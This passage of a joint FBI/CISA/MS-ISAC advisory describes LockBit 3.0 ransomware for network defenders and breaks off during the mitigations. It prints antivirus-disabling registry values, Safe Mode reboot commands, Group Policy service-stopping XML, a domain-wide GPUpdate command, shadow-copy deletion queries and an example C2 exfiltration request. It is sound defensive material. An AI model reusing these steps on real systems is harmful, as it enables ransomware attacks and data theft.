{
  "markdown": "\nSUMMARY\nNote: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.\nActions to take today to mitigate cyber threats from ransomware:\n\nPrioritize remediating known exploited vulnerabilities.\nTrain users to recognize and report phishing attempts.\nEnable and enforce phishing- resistant multifactor authentication.\n\nThe Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing & Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known LockBit 3.0 ransomware IOCs and TTPs identified through FBI investigations as recently as March 2023.\nThe LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020, LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations, which can make effective computer network defense and mitigation challenging.\nThe FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.\nDownload the PDF version of this report:\u00a0\n\n\n#StopRansomware: Lockbit\n(PDF,       688.70 KB\n  )\n\n\nTECHNICAL DETAILS\nNote: This advisory uses the MITRE ATT&CK\u00ae for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE ATT&CK for Enterprise.\nCAPABILITIES\nLockBit 3.0, also known as \u201cLockBit Black,\u201d is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.\nLockBit 3.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [T1480.001]. The password is a cryptographic key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the executable\u2019s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.\nLockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected [T1614.001], LockBit 3.0 will stop execution without infecting the system.\nINITIAL ACCESS\nAffiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation [T1133], drive-by compromise [T1189], phishing campaigns [T1566], abuse of valid accounts [T1078], and exploitation of public-facing applications [T1190].\nEXECUTION AND INFECTION PROCESS\nDuring the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges [TA0004]. LockBit 3.0 performs functions such as:\n\nEnumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices [T1082]\nTerminating processes and services [T1489]\nLaunching commands [TA0002]\nEnabling automatic logon for persistence and privilege escalation [T1547]\nDeleting log files, files in the recycle bin folder, and shadow copies residing on disk [T1485], [T1490]\n\nLockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [T1078]. When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt [T1486] data saved to any local or remote device, but skips files associated with core system functions.\nAfter files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host\u2019s wallpaper and icons to LockBit 3.0 branding [T1491.001]. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server [T1027].\nOnce completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy updates that were made, depending on which options were set at compilation time.\nEXFILTRATION\nLockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0 [TA0010]; rclone, an open-source command line cloud storage manager [T1567.002]; and publicly available file sharing services, such as MEGA [T1567.002], to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well [T1567] (see Table 1).\n\nTable 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption\n\n\nFile Sharing Site\n\n\n\n\nhttps://www.premiumize[.]com\n\n\nhttps://anonfiles[.]com\n\n\nhttps://www.sendspace[.]com\n\n\nhttps://fex[.]net\n\n\nhttps://transfer[.]sh\n\n\nhttps://send.exploit[.]in\n\n\n\nLEVERAGING FREEWARE AND OPEN-SOURCE TOOLS\nLockBit affiliates have been observed using various freeware and open-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scriptsare observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:\n\nTable 2: Freeware and Open-Source Tools Used by LockBit 3.0 Affiliates\n\n\nTool\nDescription\nMITRE ATT&CK ID\n\n\n\n\nChocolatey\nCommand-line package manager for Windows.\nT1072\n\n\nFileZilla\nCross-platform File Transfer Protocol (FTP) application.\nT1071.002\n\n\nImpacket\nCollection of Python classes for working with network protocols.\nS0357\n\n\nMEGA Ltd MegaSync\nCloud-based synchronization tool.\nT1567.002\n\n\nMicrosoft Sysinternals ProcDump\nGenerates crash dumps. Commonly used to dump the contents of Local Security Authority Subsystem Service, LSASS.exe.\nT1003.001\n\n\nMicrosoft Sysinternals PsExec\nExecute a command-line process on a remote machine.\nS0029\n\n\nMimikatz\nExtracts credentials from system.\nS0002\n\n\nNgrok\nLegitimate remote-access tool abused to bypass victim network protections.\nS0508\n\n\nPuTTY Link (Plink)\nCan be used to automate Secure Shell (SSH) actions on Windows.\nT1572\n\n\nRclone\nCommand-line program to manage cloud storage files\nS1040\n\n\nSoftPerfect Network Scanner\nPerforms network scans.\nT1046\n\n\nSplashtop\nRemote-desktop software.\nT1021.001\n\n\nWinSCP\nSSH File Transfer Protocol client for Windows.\nT1048\n\n\n\nIndicators of Compromise (IOCs)\nThe IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023.\nLockBit 3.0 Black Icon\n\n \n\n\n\u00a0\n\u00a0\nLockBit 3.0 Wallpaper\n\n \n\n\n\u00a0\n\u00a0\n\u00a0\nLockBit Command Line Parameters\n\n\n\nLockBit Parameters\nDescription\n\n\n\n\n-del\nSelf-delete.\n\n\n-gdel\nRemove LockBit 3.0 group policy changes.\n\n\n-gspd\nSpread laterally via group policy.\n\n\n-pass (32 character value)\n(Required) Password used to launch LockBit 3.0.\n\n\n-path (File or path)\nOnly encrypts provided file or folder.\n\n\n-psex\nSpread laterally via admin shares.\n\n\n-safe\nReboot host into Safe Mode.\n\n\n-wall\nSets LockBit 3.0 Wallpaper and prints out LockBit 3.0 ransom note.\n\n\n\nMutual Exclusion Object (Mutex) Created\nWhen executed, LockBit 3.0 will create the mutex, Global\\<MD4 hash of machine GUID>,and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.\nUAC Bypass via Elevated COM Interface\nLockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface. C:\\Windows\\System32\\dllhost.exe is spawned with high integrity with the command line GUID 3E5FC7F9-9A51-4367-9063-A120244FBEC.\nFor example, %SYSTEM32%\\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063- A120244FBEC7}.\nVolume Shadow Copy Deletion\nLockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3.0 uses select * from Win32_ShadowCopy to query for Volume Shadow copies, Win32_ShadowCopy.ID to obtain the ID of the shadow copy, and DeleteInstance to delete any shadow copies.\nRegistry Artifacts\nLockBit 3.0 Icon\n\n\n\nRegistry Key\nValue\nData\n\n\n\n\nHKCR\\. <Malware Extension>\n(Default)\n<Malware Extension>\n\n\nHKCR\\<Malware Extension>\\DefaultIcon\n(Default)\nC:\\ProgramData\\<Mal ware Extension>.ico\n\n\n\nLockBit 3.0 Wallpaper\n\n\n\nRegistry Key\nValue\nData\n\n\n\n\nHKCU\\Control Panel\\Desktop\\WallPaper\n(Default)\nC:\\ProgramData\\<Mal ware Extension>.bmp\n\n\n\nDisable Privacy Settings Experience\n\n\n\nRegistry Key\nValue\nData\n\n\n\n\nSOFTWARE\\Policies\\Microsoft\\Win dows\\OOBE\nDisablePrivacyE xperience\n0\n\n\n\nEnable Automatic Logon\n\n\n\nRegistry Key\nValue\nData\n\n\n\n\nSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nAutoAdminLogon\n1\n\n\n\u00a0\nDefaultUserName\n<username>\n\n\n\u00a0\nDefaultDomainNa me\n<domain name>\n\n\n\u00a0\nDefaultPassword\n<password>\n\n\n\nDisable and Clear Windows Event Logs\n\n\n\nRegistry Key\nValue\nData\n\n\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows \\CurrentVersion\\WINEVT\\Channels \\*\nEnabled\n0\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows \\CurrentVersion\\WINEVT\\Channels \\* \\ChannelAccess\nChannelAccess\nAO:BAG:SYD:(A;;0x1;; ;SY)(A;;0x5;;;BA)(A; ;0x1;;;LA)\n\n\n\nRansom Locations\n\n\n\nLockBit 3.0 File Path Locations\n\n\n\n\nADMIN$\\Temp\\<LockBit3.0 Filename>.exe\n\n\n%SystemRoot%\\Temp\\<LockBit3.0 Filename>.exe\n\n\n\\<Domain Name>\\sysvol\\<Domain Name>\\scripts\\<Lockbit 3.0 Filename>.exe (Domain Controller)\n\n\n\nSafe Mode Launch Commands\nLockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:\n\n\n\nOperating System\nSafe Mode with Networking command\n\n\n\n\nVista and newer\nbcdedit /set {current} safeboot network\n\n\nPre-Vista\nbootcfg /raw /a /safeboot:network /id 1\n\n\n\n\n\n\nOperating System\nDisable Safe mode reboot\n\n\n\n\nVista and newer\nbcdedit /deletevalue {current} safeboot\n\n\nPre-Vista\nbootcfg /raw /fastdetect /id 1\n\n\n\nGroup Policy Artifacts\nThe following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0 infection:\n\n\n\nNetworkShares.xml\n\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?><NetworkShareSettings clsid=\"{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}\"><NetShare clsid=\"{2888C5E7-94FC-4739-90AA-2C1536D68BC0}\"image=\"2\" name=\"%%ComputerName%%_D\" changed=\"%s\" uid=\"%s\"><Properties action=\"U\" name=\"%%ComputerName%%_D\" path=\"D:\" comment=\"\" allRegular=\"0\" allHidden=\"0\" allAdminDrive=\"0\" limitUsers=\"NO_CHANGE\" abe=\"NO_CHANGE\"/>\n\n\n\nServices.xml stops and disables services on the Active Directory (AD) hosts.\n\n\n\nServices.xml\n\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?><NTServices clsid=\"{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}\"><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLPBDMS\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLPBDMS\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLPBENGINE\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLPBENGINE\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"MSSQLFDLauncher\" image=\"4\" changed=\"%s\" uid=\"%s\" userContext=\"0\" removePolicy=\"0\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"MSSQLFDLauncher\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLSERVERAGENT\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLSERVERAGENT\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"MSSQLServerOLAPService\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"MSSQLServerOLAPService\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SSASTELEMETRY\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SSASTELEMETRY\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLBrowser\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLBrowser\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQL Server Distributed Replay Client\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQL Server Distributed Replay Client\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQL Server Distributed Replay Controller\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQL Server Distributed Replay Controller\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"MsDtsServer150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"MsDtsServer150\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SSISTELEMETRY150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SSISTELEMETRY150\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SSISScaleOutMaster150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SSISScaleOutMaster150\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SSISScaleOutWorker150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SSISScaleOutWorker150\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"MSSQLLaunchpad\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"MSSQLLaunchpad\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLWriter\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLWriter\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"SQLTELEMETRY\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"SQLTELEMETRY\" serviceAction=\"STOP\" timeout=\"30\"/></NTService><NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"name=\"MSSQLSERVER\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\"><Properties startupType=\"DISABLED\" serviceName=\"MSSQLSERVER\" serviceAction=\"STOP\" timeout=\"60\"/></NTService></NTServices>\n\n\n\nRegistry.pol\nThe following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.\n\n\n\nRegistry Key\nRegistry Value\nValue type\nData\n\n\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\nGroupPolicyRefresh TimeDC\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\nGroupPolicyRefresh TimeOffsetDC\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\nGroupPolicyRefresh Time\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\nGroupPolicyRefresh TimeOffset\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\nEnableSmartScreen\nREG_D WORD\n0\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s\\System\n**del.ShellSmartSc reenLevel\nREG_S Z\n\u00a0\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\nDisableAntiSpyware\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\nDisableRoutinelyTa kingAction\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\\Real-Time Protection\nDisableRealtimeMon itoring\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\\Real-Time Protection\nDisableBehaviorMon itoring\nREG_D WORD\n1\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\\Spynet\nSubmitSamplesConse nt\nREG_D WORD\n2\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window s Defender\\Spynet\nSpynetReporting\nREG_D WORD\n0\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window sFirewall\\DomainProfile\nEnableFirewall\nREG_D WORD\n0\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Window sFirewall\\StandardProfile\nEnableFirewall\nREG_D WORD\n0\n\n\n\nForce GPUpdate\nOnce new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.\n\n\n\nForce GPUpdate Powershell Command\n\n\n\n\npowershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke- GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}\n\n\n\nServices Killed\n\n\n\nvss\nsql\nsvc$\n\n\nmemtas\nmepocs\nmsexchange\n\n\nsophos\nveeam\nbackup\n\n\nGxVss\nGxBlr\nGxFWD\n\n\nGxCVD\nGxCIMgr\n\u00a0\n\n\n\nProcesses Killed\n\n\n\nsql\noracle\nocssd\n\n\ndbsnmp\nsynctime\nagntsvc\n\n\nisqlplussvc\nxfssvccon\nmydesktopservice\n\n\nocautoupds\nencsvc\nfirefox\n\n\ntbirdconfig\nmydesktopqos\nocomm\n\n\ndbeng50\nsqbcoreservice\nexcel\n\n\ninfopath\nmsaccess\nmspu\n\n\nonenote\noutlook\npowerpnt\n\n\nsteam\nthebat\nthunderbird\n\n\nvisio\nwinword\nwordpad\n\n\nnotepad\n\u00a0\n\u00a0\n\n\n\nLockBit 3.0 Ransom Note\n~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~>>>>> Your data is stolen and encrypted.If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.\n\nNetwork Connections\nIf configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.\n\n\n\nExample of HTTP POST request POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate, br Content-Type: text/plain User-Agent: Safari/537.36 <Lockbit User Agent String> Host: <Lockbit C2> Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl Example of information found in encrypted data { \"bot_version\":\"X\", \"bot_id\":\"X\", \"bot_company\":\"X\", \"host_hostname\":\"X\", \"host_user\":\"X\", \"host_os\":\"X\", \"host_domain\":\"X\", \"host_arch\":\"X\", \"host_lang\":\"X\", \"disks_info\":[ { \"disk_name\":\"X\", \"disk_size\":\"XXXX\", \"free_size\":\"XXXXX\" }\n\n\n\nUser Agent Strings\n\n\n\nMozilla/5.0 (Windows NT6.1)\nAppleWebKit/587.38(KHTML, like Gecko)\nChrome/91.0.4472.77\n\n\nSafari/537.36\nEdge/91.0.864.37\nFirefox/89.0\n\n\nGecko/20100101\n\u00a0\n\u00a0\n\n\n\nMITRE ATT&CK TECHNIQUES\nSee Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA\u2019s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.\n\nTable 3: LockBit 3.0 Actors ATT&CK Techniques for Enterprise\n\n\nInitial Access\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nExecution\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nPersistence\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nPrivilege Escalation\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nDefense Evasion\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nCredential Access\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nDiscovery\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nLateral Movement\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nCommand and Control\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nExfiltration\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\nImpact\n\u00a0\n\u00a0\n\n\nTechnique Title\nID\nUse\n\n\n\n\nValid Accounts\nT1078\nLockBit 3.0 actors obtain and abuse credentials of existing accounts as a means of gaining initial access.\n\n\nExploit External Remote Services\nT1133\nLockBit 3.0 actors exploit RDP to gain access to victim networks.\n\n\nDrive-by Compromise\nT1189\nLockBit 3.0 actors gain access to a system through a user visiting a website over the normal course of browsing.\n\n\nExploit Public-Facing Application\nT1190\nLockBit 3.0 actors exploit vulnerabilities in internet-facing systems to gain access to victims\u2019 systems.\n\n\nPhishing\nT1566\nLockBit 3.0 actors use phishing and spearphishing to gain access to victims' networks.\n\n\nExecution\nTA0002\nLockBit 3.0 launches commands during its execution.\n\n\nSoftware Deployment Tools\nT1072\nLockBit 3.0 uses Chocolatey, a command- line package manager for Windows.\n\n\nValid Accounts\nT1078\nLockBit 3.0 uses a compromised user account to maintain persistence on the target network.\n\n\nBoot or Logo Autostart Execution\nT1547\nLockBit 3.0 enables automatic logon for persistence.\n\n\nPrivilege Escalation\nTA0004\nLockbit 3.0 will attempt to escalate to the required privileges if current account privileges are insufficient.\n\n\nBoot or Logo Autostart Execution\nT1547\nLockBit 3.0 enables automatic logon for privilege escalation.\n\n\nObfuscated Files or Information\nT1027\nLockBit 3.0 will send encrypted host and bot information to its C2 servers.\n\n\nIndicator Removal: File Deletion\nT1070.004\nLockBit 3.0 will delete itself from the disk.\n\n\nExecution\u00a0Guardrails: Environmental Keying\nT1480.001\nLockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.\n\n\nOS Credential Dumping: LSASS Memory\nT1003.001\nLockBit 3.0 uses Microsoft Sysinternals ProDump to dump the contents of LSASS.exe.\n\n\nNetwork Service Discovery\nT1046\nLockBit 3.0 uses SoftPerfect Network Scanner to scan target networks.\n\n\nSystem Information Discovery\nT1082\nLockBit 3.0 will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.\n\n\nSystem\u00a0Location\u00a0\u00a0 Discovery: System Language Discovery\nT1614.001\nLockBit 3.0 will not infect machines with language settings that match a defined exclusion list.\n\n\nRemote\u00a0Services:\u00a0\u00a0 Remote Desktop Protocol\nT1021.001\nLockBit 3.0 uses Splashtop remote- desktop software to facilitate lateral movement.\n\n\nApplication Layer Protocol: File Transfer Protocols\nT1071.002\nLockBit 3.0 uses FileZilla for C2.\n\n\nProtocol Tunnel\nT1572\nLockBit 3.0 uses Plink to automate SSH actions on Windows.\n\n\nExfiltration\nTA0010\nLockBit 3.0 uses Stealbit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.\n\n\nExfiltration Over Web Service\nT1567\nLockBit 3.0 uses publicly available file sharing services to exfiltrate a target\u2019s data.\n\n\nExfiltration Over Web Service: Exfiltration to Cloud Storage\nT1567.002\nLockBit 3.0 actors use (1) rclone, an open source command line cloud storage manager to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.\n\n\nData Destruction\nT1485\nLockBit 3.0 deletes log files and empties the recycle bin.\n\n\nData Encrypted for Impact\nT1486\nLockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources.\n\n\nService Stop\nT1489\nLockBit 3.0 terminates processes and services.\n\n\nInhibit System Recovery\nT1490\nLockBit 3.0 deletes volume shadow copies residing on disk.\n\n\nDefacement: Internal Defacement\nT1491.001\nLockBit 3.0 changes the host system\u2019s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively.\n\n\n\nMITIGATIONS\nThe FBI, CISA, and the MS-ISAC recommend organizations implement the mitigations below to improve your organization\u2019s cybersecurity posture on the basis of LockBit 3.0\u2019s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA\u2019s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.\n\nImplement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers [CPG 7.3] in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud).\nRequire all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies [CPG 3.4].\n\nUse longer passwords consisting of at least 8 characters and no more than 64 characters in length [CPG 1.4]\nStore passwords in hashed format using industry-recognized password managers\nAdd password user \u201csalts\u201d to shared login credentials\nAvoid reusing passwords\nImplement multiple failed login attempt account lockouts [CPG 1.1]\nDisable password \u201chints\u201d\nRefrain from requiring password changes more frequently than once per year.\u00a0Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password \u201cpatterns\u201d cyber criminals can easily decipher.\nRequire administrator credentials to install software\n\n\nRequire phishing-resistant multifactor authentication [CPG 1.3] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.\nKeep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.\nSegment networks [CPG 8.1] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between\u2014and access to\u2014various subnetworks and by restricting adversary lateral movement.\nIdentify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [CPG 5.1]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.\nInstall, regularly update, and enable real time detection for antivirus software on all hosts.\nReview domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.\nAudit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 1.5].\nDisable unused ports.\nConsider adding an email banner to emails [CPG 